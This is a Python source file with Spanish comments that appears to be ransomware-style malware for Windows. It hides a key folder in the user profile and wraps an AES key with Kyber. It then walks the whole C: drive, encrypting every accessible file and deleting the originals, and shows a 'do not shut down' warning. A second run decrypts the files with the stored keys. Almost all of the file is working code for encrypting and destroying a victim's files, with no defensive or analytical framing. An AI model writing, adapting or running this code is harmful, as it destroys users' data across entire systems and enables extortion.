import os
import ctypes
from pqcrypto.kem.kyber512 import generate_keypair, encapsulate, decapsulate
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding

# Crear carpeta oculta para almacenar claves
def create_hidden_folder():
    hidden_folder = os.path.join(os.getenv('USERPROFILE'), 'ClaveOculta')
    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
        ctypes.windll.kernel32.SetFileAttributesW(hidden_folder, 0x02)
    return hidden_folder

hidden_folder = create_hidden_folder()

# Archivos de claves
key_aes_file = os.path.join(hidden_folder, "ClaveAES.enc")
iv_file = os.path.join(hidden_folder, "IV.txt")
private_key_file = os.path.join(hidden_folder, "ClavePrivada.bin")
public_key_file = os.path.join(hidden_folder, "ClavePublica.bin")
powershell_exe = "powershell.reverse.exe"

directories_to_ignore = [
    os.path.join(os.getenv('SystemRoot'), 'System32'),
    os.path.join(os.getenv('SystemRoot'), 'WinSxS'),
    os.path.join("C:\\", "$Recycle.Bin"),
]

error_log_file = os.path.join(hidden_folder, "error_log.txt")

def is_critical_directory(path):
    return any(path.lower().startswith(ignored.lower()) for ignored in directories_to_ignore)

def log_error(message):
    with open(error_log_file, 'a') as log_file:
        log_file.write(message + "\n")

def has_permissions(file_path):
    try:
        with open(file_path, 'rb'):
            pass
        return True
    except (PermissionError, OSError) as e:
        log_error(f"Sin permisos o inaccesible: {file_path} - Error: {e}")
        return False

def save_to_file(file_path, data):
    with open(file_path, 'wb') as file:
        file.write(data)

def load_from_file(file_path):
    with open(file_path, 'rb') as file:
        return file.read()

# Generar y cargar claves Kyber
def generate_kyber_keys():
    public_key, secret_key = generate_keypair()
    with open(private_key_file, 'wb') as priv_file:
        priv_file.write(secret_key)
    with open(public_key_file, 'wb') as pub_file:
        pub_file.write(public_key)
    return public_key, secret_key

def load_private_key():
    return load_from_file(private_key_file)

def load_public_key():
    return load_from_file(public_key_file)

# Encapsulación y desencapsulación con Kyber
def encapsulate_key_with_kyber(public_key):
    ciphertext, shared_secret = encapsulate(public_key)
    return ciphertext, shared_secret

def decapsulate_key_with_kyber(ciphertext, private_key):
    return decapsulate(ciphertext, private_key)

def generate_iv():
    return os.urandom(16)

def encrypt_file(aes_key, iv, file_path):
    encrypted_file_path = file_path + ".enc"
    try:
        with open(file_path, 'rb') as input_file, open(encrypted_file_path, 'wb') as output_file:
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
            encryptor = cipher.encryptor()
            padder = sym_padding.PKCS7(128).padder()

            while True:
                block = input_file.read(1024)
                if not block:
                    break
                padded_block = padder.update(block)
                output_file.write(encryptor.update(padded_block))

            output_file.write(encryptor.update(padder.finalize()))
            output_file.write(encryptor.finalize())
        os.remove(file_path)
    except (PermissionError, OSError) as e:
        log_error(f"Error al encriptar {file_path}: {e}")

def decrypt_file(aes_key, iv, file_path):
    decrypted_file_path = file_path[:-4]
    try:
        with open(file_path, 'rb') as input_file, open(decrypted_file_path, 'wb') as output_file:
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
            decryptor = cipher.decryptor()
            unpadder = sym_padding.PKCS7(128).unpadder()

            while True:
                block = input_file.read(1024)
                if not block:
                    break
                decrypted_block = decryptor.update(block)
                output_file.write(unpadder.update(decrypted_block))

            output_file.write(unpadder.update(decryptor.finalize()))
            output_file.write(unpadder.finalize())
        
        os.remove(file_path)
    except ValueError as e:
        log_error(f"Error de padding en {file_path}: {e}")
    except (PermissionError, OSError) as e:
        log_error(f"Error al desencriptar {file_path}: {e}")

def get_files_to_encrypt():
    files_to_encrypt = []
    root_directory = "C:\\"

    critical_directories = [
        "C:\\$Recycle.Bin",
        "C:\\Windows\\System32",
        "C:\\Windows\\WinSxS",
    ]

    python_directory = os.path.dirname(os.__file__)

    for root, dirs, files in os.walk(root_directory, topdown=True):
        dirs[:] = [d for d in dirs if os.path.join(root, d) not in critical_directories and os.path.join(root, d) != python_directory]

        for file in files:
            file_path = os.path.join(root, file)

            if file_path in {key_aes_file, iv_file, private_key_file, public_key_file, powershell_exe, __file__}:
                continue
            if file_path.endswith(('.tmp', '.crdownload', '.log')):
                continue

            if has_permissions(file_path):
                files_to_encrypt.append(file_path)

    return files_to_encrypt

def show_message(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Aviso", 0x40 | 0x1)

if __name__ == "__main__":
    if os.path.exists(key_aes_file) and os.path.exists(iv_file) and os.path.exists(private_key_file):
        # Ya existen las claves, por lo que significa que es hora de desencriptar
        private_key = load_private_key()
        ciphertext = load_from_file(key_aes_file)
        aes_key = decapsulate_key_with_kyber(ciphertext, private_key)
        iv = load_from_file(iv_file)

        for file_path in get_files_to_encrypt():
            if file_path.endswith('.enc'):
                decrypt_file(aes_key, iv, file_path)

        os.remove(key_aes_file)
        os.remove(iv_file)

    else:
        # No existen claves, generamos un nuevo par de Kyber y encapsulamos la clave AES
        public_key, private_key = generate_kyber_keys()
        ciphertext, aes_key = encapsulate_key_with_kyber(public_key)
        iv = generate_iv()

        save_to_file(key_aes_file, ciphertext)
        save_to_file(iv_file, iv)

        for file_path in get_files_to_encrypt():
            encrypt_file(aes_key, iv, file_path)

        show_message("¡NO APAGUES EL DISPOSITIVO!")

